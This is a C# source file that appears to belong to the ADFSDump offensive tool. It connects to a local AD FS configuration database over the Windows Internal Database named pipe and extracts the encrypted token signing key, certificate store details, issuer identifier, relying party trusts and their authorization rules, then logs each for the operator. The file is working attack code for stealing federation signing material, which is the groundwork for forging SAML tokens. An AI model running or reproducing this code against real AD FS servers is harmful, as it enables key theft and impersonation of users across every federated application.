using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Xml;
using ADFSDump.RelyingPartyTrust;

namespace ADFSDump.ReadDB
{
    public static class DatabaseReader
    {
        private const string WidConnectionString = "Data Source=np:\\\\.\\pipe\\microsoft##wid\\tsql\\query;Integrated Security=True";
        private const string WidConnectionStringLegacy = "Data Source=np:\\\\.\\pipe\\MSSQL$MICROSOFT##SSEE\\sql\\query";
        private const string ReadEncryptedPfxQuery = "SELECT ServiceSettingsData from [{0}].IdentityServerPolicy.ServiceSettings";
        private static readonly string[] BuiltInScopes = { "SelfScope", "ProxyTrustProvisionRelyingParty", "Device Registration Service", "UserInfo", "PRTUpdateRp", "Windows Hello - Certificate Provisioning Service", "urn:AppProxy:com" };
        private const string ReadScopePolicies = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SCOPES.SamlResponseSignatureType, SCOPES.ParameterInterface, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, POLICYTEMPLATE.InterfaceVersion, SCOPEIDS.IdentityData FROM [{0}].IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN [{0}].IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN [{0}].IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN [{0}].IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadScopePoliciesLegacy = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId,SCOPES.SamlResponseSignatureType, SAML.Binding, SAML.Location, SCOPEIDS.IdentityData FROM [{0}].IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN [{0}].IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN [{0}].IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string ReadRules = "Select SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData,POLICIES.PolicyType, POLICIES.PolicyUsage FROM [{0}].IdentityServerPolicy.Scopes SCOPE INNER JOIN [{0}].IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN [{0}].IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId";
        private const string ReadDatabases = "SELECT name FROM sys.databases";
        private const string AdfsConfigTable = "AdfsConfiguration";
        private const string Adfs2012R2 = "AdfsConfiguration";
        private const string Adfs2016 = "AdfsConfigurationV3";
        private const string Adfs2019 = "AdfsConfigurationV4";


        public static DumpResult ReadConfigurationDb(Dictionary<string, string> arguments)
        {
            string connectionString;
            var os = Environment.OSVersion;
            if ((os.Version.Major == 6 && os.Version.Minor <= 1) || os.Version.Major < 6)
            {
                // we are on 2008 R2 or below which means legacy
                connectionString = WidConnectionStringLegacy;
            }
            else if (arguments.ContainsKey("/database"))
            {
                connectionString = arguments["/database"];
            }
            else
            {
                connectionString = WidConnectionString;
            }

            SqlConnection conn = null;
            try
            {
                conn = new SqlConnection(connectionString);
                conn.Open();

                string adfsVersion = GetAdfsVersion(conn);
                if (string.IsNullOrEmpty(adfsVersion))
                {
                    Log.Status("!! Error identifying AD FS version");
                    return null;
                }

                return ReadWid(adfsVersion, conn);
            }
            catch (Exception e)
            {
                Log.Status("!!! Error reading configuration database using connection string: " + connectionString + ".\n" + e);
                return null;
            }
            finally
            {
                if (conn != null) conn.Dispose();
            }
        }

        public static string SafeGetString(this SqlDataReader reader, string colName)
        {
            int colIndex = reader.GetOrdinal(colName);
            if (!reader.IsDBNull(colIndex))
                return reader.GetString(colIndex);
            return string.Empty;
        }

        private static string GetAdfsVersion(SqlConnection conn)
        {
            using (SqlCommand cmd = new SqlCommand(ReadDatabases, conn))
            using (SqlDataReader reader = cmd.ExecuteReader())
            {
                while (reader.Read())
                {
                    string dbName = (string)reader["name"];
                    if (dbName.Contains(AdfsConfigTable))
                    {
                        return dbName;
                    }
                }
            }
            return null;
        }

        private static DumpResult ReadWid(string dbName, SqlConnection conn)
        {
            var result = new DumpResult();
            var rps = new Dictionary<string, RelyingParty>();

            Log.Status("## Reading Encrypted Signing Key from Database");
            using (SqlCommand cmd = new SqlCommand(string.Format(ReadEncryptedPfxQuery, dbName), conn))
            using (SqlDataReader reader = cmd.ExecuteReader())
            {
                while (reader.Read())
                {
                    string xmlString = (string)reader["ServiceSettingsData"];

                    XmlDocument xmlDocument = new XmlDocument();
                    xmlDocument.LoadXml(xmlString);

                    XmlElement root = xmlDocument.DocumentElement;

                    XmlElement signingToken = root.GetElementsByTagName("SigningToken")[0] as XmlElement;
                    if (signingToken != null)
                    {
                        var signingKey = new SigningKeyInfo
                        {
                            EncryptedPfx = signingToken.GetElementsByTagName("EncryptedPfx")[0].InnerText,
                            CertificateValue = signingToken.GetElementsByTagName("FindValue")[0].InnerText,
                            StoreLocationValue = signingToken.GetElementsByTagName("StoreLocationValue")[0].InnerText,
                            StoreNameValue = signingToken.GetElementsByTagName("StoreNameValue")[0].InnerText
                        };
                        result.SigningKey = signingKey;
                        Log.Data("[-] Encrypted Token Signing Key Begin\r\n{0}\r\n[-] Encrypted Token Signing Key End\r\n", signingKey.EncryptedPfx);
                        Log.Data("[-] Certificate value: {0}", signingKey.CertificateValue);
                        Log.Data("[-] Store location value: {0}", signingKey.StoreLocationValue);
                        Log.Data("[-] Store name value: {0}\r\n", signingKey.StoreNameValue);
                    }

                    Log.Status("## Reading The Issuer Identifier");

                    XmlElement issuer = root.GetElementsByTagName("Issuer")[0] as XmlElement;
                    if (issuer != null)
                    {
                        result.IssuerIdentifier = issuer.GetElementsByTagName("Address")[0].InnerText;
                        Log.Data("[-] Issuer Identifier: {0}", result.IssuerIdentifier);
                    }
                }
            }

            // enumerate scopes and policies
            string readScopePolicies;
            switch (dbName)
            {
                case Adfs2016:
                    Log.Status("[-] Detected AD FS 2016");
                    readScopePolicies = string.Format(ReadScopePolicies, dbName);
                    break;
                case Adfs2019:
                    Log.Status("[-] Detected AD FS 2019/2022 (AdfsConfigurationV4)");
                    readScopePolicies = string.Format(ReadScopePolicies, dbName);
                    break;
                case Adfs2012R2:
                    Log.Status("[-] Detected AD FS 2012 R2");
                    readScopePolicies = string.Format(ReadScopePoliciesLegacy, dbName);
                    break;
                default:
                    Log.Status("!!! Couldn't determine AD FS version. Found database {0}. Quitting", dbName);
                    return null;
            }

            Log.Status("## Reading Relying Party Trust Information from Database");
            using (SqlCommand cmd = new SqlCommand(readScopePolicies, conn))
            using (SqlDataReader reader = cmd.ExecuteReader())
            {
                while (reader.Read())
                {
                    string name = reader.SafeGetString("Name");
                    if (BuiltInScopes.Any(name.Contains))
                    {
                        continue;
                    }

                    string scopeId = reader["ScopeId"].ToString();
                    RelyingParty rp = new RelyingParty { Name = name, Id = scopeId };
                    rp.IsEnabled = (bool)reader["Enabled"];
                    rp.SignatureAlgorithm = reader.SafeGetString("SignatureAlgorithm");
                    if (dbName != Adfs2012R2)
                    {
                        rp.AccessPolicy = reader.SafeGetString("PolicyMetadata");
                        if (!reader.IsDBNull(9))
                        {
                            rp.AccessPolicyParam = reader.SafeGetString("ParameterInterface");
                        }
                    }

                    rp.Identity = reader.SafeGetString("IdentityData");

                    if (!reader.IsDBNull(2))
                    {
                        rp.IsSaml = false;
                        rp.IsWsFed = true;
                        rp.FederationEndpoint = reader.SafeGetString("WSFederationPassiveEndpoint");
                    }
                    else
                    {
                        rp.IsSaml = true;
                        rp.IsWsFed = false;
                        rp.FederationEndpoint = reader.SafeGetString("Location");
                    }

                    if (!reader.IsDBNull(6))
                    {
                        rp.EncryptionCert = reader.SafeGetString("EncryptionCertificate");
                    }

                    rp.SamlResponseSignatureType = (int)reader["SamlResponseSignatureType"];
                    rps[scopeId] = rp;
                }
            }

            using (SqlCommand cmd = new SqlCommand(string.Format(ReadRules, dbName), conn))
            using (SqlDataReader reader = cmd.ExecuteReader())
            {
                while (reader.Read())
                {
                    string scopeId = reader["ScopeId"].ToString();
                    string rule = reader.SafeGetString("PolicyData");
                    if (rps.Keys.Contains(scopeId) && !string.IsNullOrEmpty(rule))
                    {
                        PolicyType ruleType = (PolicyType)reader["PolicyUsage"];
                        switch (ruleType)
                        {
                            case PolicyType.StrongAuthAuthorizationRules:
                                rps[scopeId].StrongAuthRules = rule;
                                break;
                            case PolicyType.OnBehalfAuthorizationRules:
                                rps[scopeId].OnBehalfAuthRules = rule;
                                break;
                            case PolicyType.ActAsAuthorizationRules:
                                rps[scopeId].AuthRules = rule;
                                break;
                            case PolicyType.IssuanceRules:
                                rps[scopeId].IssuanceRules = rule;
                                break;
                        }
                    }
                }
            }

            result.RelyingParties = new List<RelyingParty>(rps.Values);
            return result;
        }
    }
}
